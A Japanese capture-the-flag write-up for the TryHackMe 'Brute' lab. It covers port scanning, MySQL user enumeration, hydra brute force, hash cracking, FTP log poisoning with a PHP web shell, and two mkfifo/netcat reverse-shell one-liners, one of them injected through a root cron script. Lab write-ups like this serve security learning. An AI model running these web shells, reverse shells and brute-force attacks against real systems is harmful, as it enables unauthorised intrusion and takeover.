# Brute CTF

https://tryhackme.com/room/ettubrute

## Enumeration

### ポートスキャン

```shell
TARGET=10.10.126.55
sudo bash -c "echo $TARGET   brute.thm >> /etc/hosts"

root@ip-10-10-110-241:~# sudo nmap -sS -p- $TARGET
Starting Nmap 7.80 ( https://nmap.org ) at 2025-05-15 06:29 BST
Nmap scan report for brute.thm (10.10.171.88)
Host is up (0.00021s latency).
Not shown: 65531 closed ports
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
80/tcp   open  http
3306/tcp open  mysql
MAC Address: 02:3D:42:9B:55:A7 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 2.52 seconds
root@ip-10-10-110-241:~# sudo nmap -sV -p21,22,80,3306 $TARGET
Starting Nmap 7.80 ( https://nmap.org ) at 2025-05-15 06:29 BST
Nmap scan report for brute.thm (10.10.171.88)
Host is up (0.00018s latency).

PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 3.0.5
22/tcp   open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http        Apache httpd 2.4.41 ((Ubuntu))
3306/tcp open  nagios-nsca Nagios NSCA
MAC Address: 02:3D:42:9B:55:A7 (Unknown)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

$ nmap -sV -A -p 21,22,80,3306 $TARGET
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-15 15:34 JST
Nmap scan report for brute.thm (10.10.126.55)
Host is up (0.34s latency).

PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.5
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 8f:c8:e3:28:42:77:fa:d0:73:83:c4:aa:b5:61:7f:52 (RSA)
|   256 28:34:7a:6d:14:35:f3:88:d8:84:05:3a:1e:e2:1e:af (ECDSA)
|_  256 64:d9:17:eb:57:a3:29:15:14:80:14:d7:de:c3:34:7f (ED25519)
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
|_http-title: Login
3306/tcp open  mysql   MySQL 8.0.41-0ubuntu0.20.04.1
| mysql-info:
|   Protocol: 10
|   Version: 8.0.41-0ubuntu0.20.04.1
|   Thread ID: 173206
|   Capabilities flags: 65535
|   Some Capabilities: IgnoreSpaceBeforeParenthesis, SupportsCompression, FoundRows, LongColumnFlag, ODBCClient, SupportsTransactions, SwitchToSSLAfterHandshake, Speaks41ProtocolOld, Support41Auth, DontAllowDatabaseTableColumn, SupportsLoadDataLocal, IgnoreSigpipes, ConnectWithDatabase, InteractiveClient, LongPassword, Speaks41ProtocolNew, SupportsAuthPlugins, SupportsMultipleResults, SupportsMultipleStatments
|   Status: Autocommit
|   Salt: ~QtePYI '\x1AH*\x13f\x02\x1EYg/+
|_  Auth Plugin Name: caching_sha2_password
| ssl-cert: Subject: commonName=MySQL_Server_8.0.26_Auto_Generated_Server_Certificate
| Not valid before: 2021-10-19T04:00:09
|_Not valid after:  2031-10-17T04:00:09
|_ssl-date: TLS randomness does not represent time
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 4.X
OS CPE: cpe:/o:linux:linux_kernel:4.15
OS details: Linux 4.15
Network Distance: 4 hops
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

FTP, SSH, HTTP, MySQL

FTP は anonymous でログインできなかった。

### サブドメイン

```shell
ffuf -u http://brute.thm -c -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -H 'Host: FUZZ.brute.thm' -fs 1080
```

なし。

### gobuster

```shell
cat /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt /usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt | sort -u > ./dirlist.txt

gobuster dir -x=txt,php -u http://brute.thm -w ./dirlist.txt -t 30 -k

===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/config.php           (Status: 200) [Size: 0]
/index.php            (Status: 200) [Size: 1080]
/logout.php           (Status: 302) [Size: 0] [--> index.php]
/welcome.php          (Status: 302) [Size: 0] [--> login.php]
Progress: 681570 / 681573 (100.00%)
===============================================================
Finished
===============================================================
```

### sqlmap

```sh
sqlmap -r ./req-login.txt --dbs --batch
```

脆弱性発見できず。手作業で探しても無駄と判断する。

### mysql

```sh
$ mysql -h $TARGET -u root -p --skip-ssl-verify-server-cert
Enter password:
ERROR 1045 (28000): Access denied for user 'root'@'ip-10-2-22-182.eu-west-1.compute.internal' (using password: NO)
```

root ＆ 空パスワードではログインできない。

#### nmap scripts

```sh
$ sudo nmap -sS -n -p3306 --script "mysql-enum" $TARGET
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-15 15:47 JST
Nmap scan report for 10.10.126.55
Host is up (0.46s latency).

PORT     STATE SERVICE
3306/tcp open  mysql
| mysql-enum:
|   Valid usernames:
|     root:<empty> - Valid credentials
|     netadmin:<empty> - Valid credentials
|     guest:<empty> - Valid credentials
|     user:<empty> - Valid credentials
|     web:<empty> - Valid credentials
|     sysadmin:<empty> - Valid credentials
|     administrator:<empty> - Valid credentials
|     webadmin:<empty> - Valid credentials
|     admin:<empty> - Valid credentials
|     test:<empty> - Valid credentials
|_  Statistics: Performed 10 guesses in 2 seconds, average tps: 5.0

Nmap done: 1 IP address (1 host up) scanned in 3.53 seconds
```

出てきた名前でリストを作り、ブルートフォース。

```sh
hydra -L ./names.txt -P /usr/share/wordlists/rockyou.txt $TARGET mysql -t 30 | tee ./hydra.txt

root@ip-10-10-177-118:~# head ./hydra.txt
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-05-15 08:00:26
[DATA] max 4 tasks per 1 server, overall 4 tasks, 143443980 login tries (l:10/p:14344398), ~35860995 tries per task
[DATA] attacking mysql://10.10.126.55:3306/
[3306][mysql] host: 10.10.126.55   login: root   password: ひみつ
```

ブルートフォースを検知して大量のエラーが出るが、検知するまでの一瞬で成功していたのでなんとか知ることができた。

パスワードを使い、root で接続成功。

```sh
$ mysql -h $TARGET -u root -p --skip-ssl
Enter password:
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MySQL connection id is 176859
Server version: 8.0.41-0ubuntu0.20.04.1 (Ubuntu)

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Support MariaDB developers by giving a star at https://github.com/MariaDB/server
Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MySQL [(none)]>
```

```sh
MySQL [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| sys                |
| website            |
+--------------------+
5 rows in set (48.033 sec)

MySQL [(none)]> use website;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MySQL [website]> show tables;
+-------------------+
| Tables_in_website |
+-------------------+
| users             |
+-------------------+
1 row in set (0.335 sec)

MySQL [website]> select * from users;
+----+----------+--------------------------------------------------------------+---------------------+
| id | username | password                                                     | created_at          |
+----+----------+--------------------------------------------------------------+---------------------+
|  1 | Adrian   | [REDACTED]                                                   | 2021-10-20 02:43:42 |
+----+----------+--------------------------------------------------------------+---------------------+
1 row in set (0.520 sec)
```

hashcat で クラック可能だった。

```sh
.\hashcat.exe -m 3200 hash.txt rockyou.txt
```

この認証情報を使い、ログイン画面からログイン。

## welcome.php

log ボタンを押したら下記が表示された。

```
Thu May 15 06:26:43 2025 [pid 41943] CONNECT: Client "::ffff:10.2.22.182" Thu May 15 06:28:20 2025 [pid 42032] CONNECT: Client "::ffff:10.2.22.182" Thu May 15 06:28:29 2025 [pid 42031] [anonymous] FAIL LOGIN: Client "::ffff:10.2.22.182" Thu May 15 06:35:22 2025 [pid 42382] CONNECT: Client "::ffff:10.2.22.182" Thu May 15 06:35:36 2025 [pid 42387] CONNECT: Client "::ffff:10.2.22.182" Thu May 15 06:35:36 2025 [pid 42388] CONNECT: Client "::ffff:10.2.22.182" Thu May 15 06:35:36 2025 [pid 42393] CONNECT: Client "::ffff:10.2.22.182" Thu May 15 06:35:36 2025 [pid 42394] CONNECT: Client "::ffff:10.2.22.182" Thu May 15 06:35:39 2025 [pid 42391] [anonymous] FAIL LOGIN: Client "::ffff:10.2.22.182" Thu May 15 06:35:39 2025 [pid 42386] [anonymous] FAIL LOGIN: Client "::ffff:10.2.22.182" Thu May 15 06:35:39 2025 [pid 42385] [anonymous] FAIL LOGIN: Client "::ffff:10.2.22.182" Thu May 15 06:35:46 2025 [pid 42422] CONNECT: Client "::ffff:10.2.22.182" Thu May 15 06:35:46 2025 [pid 42425] CONNECT: Client "::ffff:10.2.22.182" Thu May 15 06:35:47 2025 [pid 42427] CONNECT: Client "::ffff:10.2.22.182"
```

anonymous の失敗施行が出ていることから、FTP のアクセスログと思われる。

### ログポイズニング

FTP ログイン時の名前に Web シェルを埋め込む。

```sh
$ ftp $TARGET
Connected to 10.10.126.55.
220 (vsFTPd 3.0.5)
Name (10.10.126.55:kali): <?=`$_GET[0]`?>
331 Please specify the password.
Password:
530 Login incorrect.
ftp: Login failed
ftp> exit
221 Goodbye.
```

GET_0 パラメータとしてリバースシェルを送る。

```http
POST /welcome.php&0=%72%6d%20%2f%74%6d%70%2f%66%3b%6d%6b%66%69%66%6f%20%2f%74%6d%70%2f%66%3b%63%61%74%20%2f%74%6d%70%2f%66%7c%73%68%20%2d%69%20%32%3e%26%31%7c%6e%63%20%31%30%2e%32%2e%32%32%2e%31%38%32%20%36%36%36%36%20%3e%2f%74%6d%70%2f%66 HTTP/1.1
Host: brute.thm
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 229
Origin: http://brute.thm
Connection: keep-alive
Referer: http://brute.thm/welcome.php
Cookie: PHPSESSID=lkhgjnj1gf2olvaqf84djd974s
Upgrade-Insecure-Requests: 1
Priority: u=0, i

log=Log
```

リバースシェル取得成功。

```sh
$ nc -nlvp 6666
listening on [any] 6666 ...
connect to [10.2.22.182] from (UNKNOWN) [10.10.126.55] 58948
sh: 0: can't access tty; job control turned off
$
```

## 権限昇格

```sh
www-data@ip-10-10-148-189:/var/www/html$ cd /home/adrian/
www-data@ip-10-10-148-189:/home/adrian$ ls -al
total 48
drwxr-xr-x 4 adrian adrian  4096 Apr  5  2022 .
drwxr-xr-x 4 root   root    4096 May 15 07:48 ..
lrwxrwxrwx 1 adrian adrian     9 Oct 20  2021 .bash_history -> /dev/null
-rw-r--r-- 1 adrian adrian   220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 adrian adrian  3771 Feb 25  2020 .bashrc
drwx------ 2 adrian adrian  4096 Oct 19  2021 .cache
-rw-r--r-- 1 adrian adrian   807 Feb 25  2020 .profile
-rw-r--r-- 1 adrian adrian    43 Oct 20  2021 .reminder
-rw-rw-r-- 1 adrian adrian    75 Apr  5  2022 .selected_editor
-rw-r--r-- 1 adrian adrian     0 Oct 19  2021 .sudo_as_admin_successful
-rw------- 1 adrian adrian     0 Apr  6  2022 .viminfo
drwxr-xr-x 3 nobody nogroup 4096 Oct 20  2021 ftp
-rw-r----- 1 adrian adrian   140 May 15 07:55 punch_in
-rw-r----- 1 root   adrian    94 Apr  5  2022 punch_in.sh
-rw-r----- 1 adrian adrian    21 Apr  5  2022 user.txt
```

adrian になる必要がある。

```sh
www-data@ip-10-10-148-189:/home/adrian$ ls -al ftp/files
total 16
drwxr-xr-x 2 adrian adrian  4096 Oct 23  2021 .
drwxr-xr-x 3 nobody nogroup 4096 Oct 20  2021 ..
-rw-r----- 1 adrian adrian   203 Oct 20  2021 .notes
-rw-r----- 1 adrian adrian    90 Oct 21  2021 script
```

```sh
www-data@ip-10-10-148-189:/home/adrian$ cat .reminder
Rules:
best of 64
+ exclamation

[REDACTED]
```

意図がやや曖昧だが、best64 ルール適用後、末尾に!を付ける。

```sh
echo '[REDACTED]' > ./list.txt
john --wordlist=./list.txt --rules=best64 --stdout > ruledlist.txt
sed 's/$/!/' ruledlist.txt > pwlist.txt
```

SSH ブルートフォースでパスワード判明。

```sh
root@ip-10-10-177-118:~# hydra -l adrian -P ./pwlist.txt 10.10.148.189 ssh -t 30
```

ユーザーフラグゲット。

```sh
adrian@ip-10-10-148-189:~$ cat ./user.txt
THM{..................}
```

## 権限昇格２

```sh
adrian@ip-10-10-148-189:~$ ls -al
total 48
drwxr-xr-x 4 adrian adrian  4096 Apr  5  2022 .
drwxr-xr-x 4 root   root    4096 May 15 07:48 ..
lrwxrwxrwx 1 adrian adrian     9 Oct 20  2021 .bash_history -> /dev/null
-rw-r--r-- 1 adrian adrian   220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 adrian adrian  3771 Feb 25  2020 .bashrc
drwx------ 2 adrian adrian  4096 Oct 19  2021 .cache
drwxr-xr-x 3 nobody nogroup 4096 Oct 20  2021 ftp
-rw-r--r-- 1 adrian adrian   807 Feb 25  2020 .profile
-rw-r----- 1 adrian adrian   720 May 15 08:24 punch_in
-rw-r----- 1 root   adrian    94 Apr  5  2022 punch_in.sh
-rw-r--r-- 1 adrian adrian    43 Oct 20  2021 .reminder
-rw-rw-r-- 1 adrian adrian    75 Apr  5  2022 .selected_editor
-rw-r--r-- 1 adrian adrian     0 Oct 19  2021 .sudo_as_admin_successful
-rw-r----- 1 adrian adrian    21 Apr  5  2022 user.txt
-rw------- 1 adrian adrian     0 Apr  6  2022 .viminfo
```

時刻を記録するスクリプトが、1 分ごとに実行されている。

```sh
adrian@ip-10-10-148-189:~$ cat ./punch_in.sh
#!/bin/bash

/usr/bin/echo 'Punched in at '$(/usr/bin/date +"%H:%M") >> /home/adrian/punch_in
```

### ftp 配下

```sh
adrian@ip-10-10-148-189:~$ ls -al ./ftp/files
total 16
drwxr-xr-x 2 adrian adrian  4096 Oct 23  2021 .
drwxr-xr-x 3 nobody nogroup 4096 Oct 20  2021 ..
-rw-r----- 1 adrian adrian   203 Oct 20  2021 .notes
-rw-r----- 1 adrian adrian    90 Oct 21  2021 script
```

```sh
adrian@ip-10-10-148-189:~$ cat ./ftp/files/.notes
That silly admin
He is such a micro manager, wants me to check in every minute by writing
on my punch card.

He even asked me to write the script for him.

Little does he know, I am planning my revenge.
```

このスクリプト（のおそらくコピー）を root が実行すると思われる。

```sh
adrian@ip-10-10-148-189:~$ cat ./ftp/files/script
#!/bin/sh
while read line;
do
  /usr/bin/sh -c "echo $line";
done < /home/adrian/punch_in
```

単純なコマンドインジェクションが成立する。

```sh
adrian@ip-10-10-148-189:~$ echo 'aa; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.177.118 8888 >/tmp/f' > ./punch_in
```

root シェル取得成功。

```sh
root@ip-10-10-177-118:~# nc -nlvp 8888
Listening on 0.0.0.0 8888
Connection received on 10.10.148.189 46154
sh: 0: can't access tty; job control turned off
# id
uid=0(root) gid=0(root) groups=0(root)
# ls -al /root
total 40
drwx------  5 root root 4096 Apr  5  2022 .
drwxr-xr-x 20 root root 4096 May 15 07:48 ..
lrwxrwxrwx  1 root root    9 Oct 20  2021 .bash_history -> /dev/null
-rw-r--r--  1 root root 3106 Dec  5  2019 .bashrc
drwx------  2 root root 4096 Oct 19  2021 .cache
-rw-r-----  1 root root   90 Oct 23  2021 check_in.sh
lrwxrwxrwx  1 root root    9 Oct 20  2021 .mysql_history -> /dev/null
-rw-r--r--  1 root root  161 Dec  5  2019 .profile
-rw-r-----  1 root root   34 Apr  5  2022 root.txt
-rw-r--r--  1 root root   75 Oct 20  2021 .selected_editor
drwxr-xr-x  3 root root 4096 Oct 19  2021 snap
drwx------  2 root root 4096 Oct 19  2021 .ssh
-rw-------  1 root root    0 Apr  6  2022 .viminfo
# cat /root/root.txt
THM{.............................}
```

## 振り返り

- 内容的には難しくなかったが、たまたま VPN サーバーが重かっただけなのか、このルームの仕様なのか不明だが、とにかく動作が重く、非常にストレスを感じた。
- mysql ポートが開いているときユーザー列挙できる可能性があるのは覚えておきたい。
- その他は知っていたテクニックの応用。
